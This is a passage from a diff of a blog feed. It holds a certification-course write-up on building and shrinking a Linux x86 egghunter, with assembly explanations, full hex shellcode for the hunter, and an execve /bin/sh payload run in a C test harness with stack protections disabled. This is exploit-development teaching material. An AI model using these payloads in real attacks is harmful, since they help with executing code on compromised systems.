+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x1000&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;But because of the smart trick employed by the original shellcode author to reduce the code size, the second part of the sequence is actually "reused" for traversing bytes inside of a valid memory page. &lt;/p&gt;
 &lt;p&gt;In the following instruction&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;value 0x4 is added to the address held in EDX because it allows eight bytes of contiguous memory to be validated in a single swoop. The reason that it works in all cases is because the implementation will increment by page size when it encounters invalid addresses, thus it’s impossible that EDX+0x4 could be valid and EDX itself not.&lt;/p&gt;
 &lt;p&gt;To traverse through memory the implementation relies on the &lt;code&gt;access&lt;/code&gt; system call (0x21) that checks whether the calling process can access the file at the specified pathname. But its main functionality is not used in this case. The implementation actually uses the side effect of the function: when it tries to access the pathname string by its address loaded in EBX it returns an &lt;code&gt;EFAULT&lt;/code&gt; error meaning that pathname points outside of process's accessible address space. So when we get the &lt;code&gt;EFAULT&lt;/code&gt; error code returned in EAX we may conclude that EBX points to unmapped inaccessible memory and hence we can safely skip the current page and check the next one.&lt;/p&gt;
 &lt;p&gt;The &lt;code&gt;EFAULT&lt;/code&gt; constant is defined as equal to 14 (0xe). But when this error occurs the kernel actually returns its value negated: -EFAULT = -0xe = 0xffffffff-0xe = 0xfffffff2. That's why the following part of the code&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xf2&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xf2&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;checks if AL (lowest 8 bits of EAX register) contains 0xf2.&lt;/p&gt;
 &lt;h1&gt;Fixing the bug&lt;/h1&gt;
 &lt;p&gt;The access function signature can be found in Linux manual pages by running &lt;code&gt;man 2 access&lt;/code&gt; command:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;int access(const char *pathname, int mode);
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;int access(const char *pathname, int mode);
 …
 ERRORS
         access() shall fail if:
@@ -1916,19 +1916,19 @@ ERRORS
 
 &lt;p&gt;Note that it actually takes 2 parameters. And that was the reason the reference implementation did not work for me. Most likely Linux developers have changed internal implementation of the &lt;code&gt;access&lt;/code&gt; function from the time skape wrote his paper. &lt;/p&gt;
 &lt;p&gt;Following Linux syscall convention the 1&lt;sup&gt;st&lt;/sup&gt; syscall argument goes into EBX register, 2&lt;sup&gt;nd&lt;/sup&gt; into ECX, 3&lt;sup&gt;rd&lt;/sup&gt; into EDX, etc. The correct values for the second argument that must be put into ECX, according to the man page and &lt;code&gt;/usr/include/unistd.h&lt;/code&gt; file, can be a value of 0 through 7. And when it is not the case the function, instead of &lt;code&gt;EFAULT&lt;/code&gt;, returns the &lt;code&gt;EINVAL&lt;/code&gt; error and the whole construction collapses resulting in a segfault. To fix the issue I had to insert&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;right before &lt;code&gt;int 80h&lt;/code&gt; instruction, effectively setting the second argument for the access function to be 0, which is a valid value.&lt;/p&gt;
 &lt;p&gt;Now, after the egghunter is fixed we can build a binary out of it and extract the payload:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf egghunter2.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld egghunter2.o -o egghunter2
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nasm -f elf egghunter2.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld egghunter2.o -o egghunter2
 scdump egghunter2
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Output (formatted to fit the screen):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Length: 37
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Length: 37
 Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd&amp;quot;
 &amp;quot;\x80\x3c\xf2\x74\xec\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7&amp;quot;
 &lt;/pre&gt;&lt;/div&gt;
@@ -1936,15 +1936,15 @@ Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\
 
 &lt;p&gt;Note that original shellcode length (35 bytes) increased by 2 bytes because of the applied fix.&lt;/p&gt;
 &lt;p&gt;After inserting the egghunter and our earlier generated payload into a C source code and compiling it we get a working PoC:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;gcc scframe.c -fno-stack-protector -z execstack -o scframe &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./scframe
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc scframe.c -fno-stack-protector -z execstack -o scframe &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./scframe
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;&lt;img alt="Working egghunter PoC" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/working-egghunter-poc.png" title="Working egghunter PoC" /&gt;
+&lt;p&gt;&lt;img alt="Working egghunter PoC" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/working-egghunter-poc.png" title="Working egghunter PoC"&gt;
 &lt;div class="img-caption"&gt;Working egghunter PoC&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;Contents of the scframe.c:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
-&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
 
 &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;egghunter&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd\x80\x3c&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
@@ -1970,17 +1970,17 @@ Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\
 &lt;h1&gt;Reducing the size&lt;/h1&gt;
 &lt;p&gt;Trying to reduce the size of the shellcode I looked at other Linux syscalls hoping to find one whose side effect I could use in a similar manner and which took only one pointer argument. And I found one - &lt;code&gt;chdir&lt;/code&gt;. &lt;/p&gt;
 &lt;p&gt;The only argument the function takes is the pointer to a string containing path. It is not as good as the access function and in the worst case scenario, if it encounters a valid directory path in the process memory you will end up running in some random directory. On the positive side using this system call we can claim back the added bytes by removing the &lt;code&gt;xor ecx, ecx&lt;/code&gt; instruction. The changed part of the egghunter:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;   &lt;span class="c1"&gt;; chdir syscall # &lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;   &lt;span class="c1"&gt;; chdir syscall # &lt;/span&gt;
     &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
     &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;After re-building the egghunter, extracting the shellcode with &lt;code&gt;scdump&lt;/code&gt;, inserting it into our C program and, finally, building it we get another working sample which is 35 bytes long:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Egghunter with replaced system call" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/egghunter-with-replaced-system-call.png" title="Egghunter with replacecd system call" /&gt;
+&lt;p&gt;&lt;img alt="Egghunter with replaced system call" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/egghunter-with-replaced-system-call.png" title="Egghunter with replacecd system call"&gt;
 &lt;div class="img-caption"&gt;Egghunter with replaced system call&lt;/div&gt;&lt;/p&gt;
 &lt;p&gt;Next, to win us a couple more bytes we can use 4 bytes long egg and modify the algorithm. To solve the problem of storing the same egg pattern with the egghunter algo we can simply modify the egg after loading it into EAX register and then prepend the modified version to the main payload. This change eliminates check for the second dword of 8-byte long egg. The modified code follows:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
     &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
 
 &lt;span class="nl"&gt;_start:&lt;/span&gt;
@@ -2005,7 +2005,7 @@ Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\
 
 
 &lt;p&gt;Note how we need to change the egg in front of our main payload in the C program. The first byte is now &lt;code&gt;\x91&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x91\x50\x90\x50&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;// EGG&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;// SHELLCODE&lt;/span&gt;
 &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -2013,7 +2013,7 @@ Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\
 
 
 &lt;p&gt;Building and running C program with updated egghunter and egg we get the working result with 32-bytes long egghunter:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="Final egghunter version, 32 bytes long" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/egghunter-final-version.png" title="Final egghunter version, 32 bytes long" /&gt;
+&lt;p&gt;&lt;img alt="Final egghunter version, 32 bytes long" src="http://www.wryway.com/blog/egghunter-technqiue-for-exploit-development/egghunter-final-version.png" title="Final egghunter version, 32 bytes long"&gt;
 &lt;div class="img-caption"&gt;Final egghunter version, 32 bytes long&lt;/div&gt;&lt;/p&gt;
 &lt;div class="divider"&gt;&lt;/div&gt;
 
@@ -2025,4 +2025,4 @@ Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\
 
 &lt;p&gt;&lt;hr&gt;
 This blog post was created to fulfill the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
-&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="SLAE"></category><category term="Linux"></category></entry></feed>
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</content><category term="SLAE"></category><category term="Linux"></category></entry></feed>
